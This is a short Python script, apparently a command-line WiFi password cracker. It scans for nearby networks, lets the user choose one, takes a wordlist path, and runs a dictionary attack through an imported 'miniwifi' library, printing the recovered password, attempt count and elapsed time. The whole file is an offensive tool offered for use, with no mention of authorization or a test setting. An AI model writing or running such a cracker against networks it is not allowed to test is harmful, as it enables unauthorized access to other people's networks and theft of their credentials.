from miniwifi import WifiScanner, WifiCracker
from colorama import Fore, Style, init

init(autoreset=True)

def display_networks(networks):
    print(Fore.WHITE + "\nAvailable Networks :\n")
    for i, ssid in enumerate(networks, 1):
        print(Fore.GREEN + f"[{i}] " + Fore.WHITE + ssid)

def main():
    scanner = WifiScanner()
    print(Fore.WHITE + "[*] Scanning for WiFi networks...\n")

    networks = scanner.scan_networks()
    display_networks(networks)

    try:
        choice = int(input(Fore.WHITE + "\nSelect network number : ")) - 1
        ssid = networks[choice]

        wordlist = input(Fore.WHITE + "Enter wordlist path : ")

        cracker = WifiCracker()
        print(Fore.GREEN + f"\n[+] Cracking {ssid}... (Press Ctrl+C to stop)\n")

        result = cracker.crack(ssid, wordlist)

        if result['success']:
            print(Fore.GREEN + "\n[✓] SUCCESS!")
            print(Fore.GREEN + f"    Password : {result['password']}")
        else:
            print(Fore.RED + "\n[✗] Password not found in wordlist")

        print(Fore.WHITE + f"    Attempts : {result['attempt']}")
        print(Fore.WHITE + f"    Time     : {result['elapsed']:.2f}s")

    except (ValueError, IndexError):
        print(Fore.RED + "\n[!] Invalid selection")

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Operation cancelled by user")

    except Exception as e:
        print(Fore.RED + f"\n[!] Error : {str(e)}")

if __name__ == "__main__":
    main()
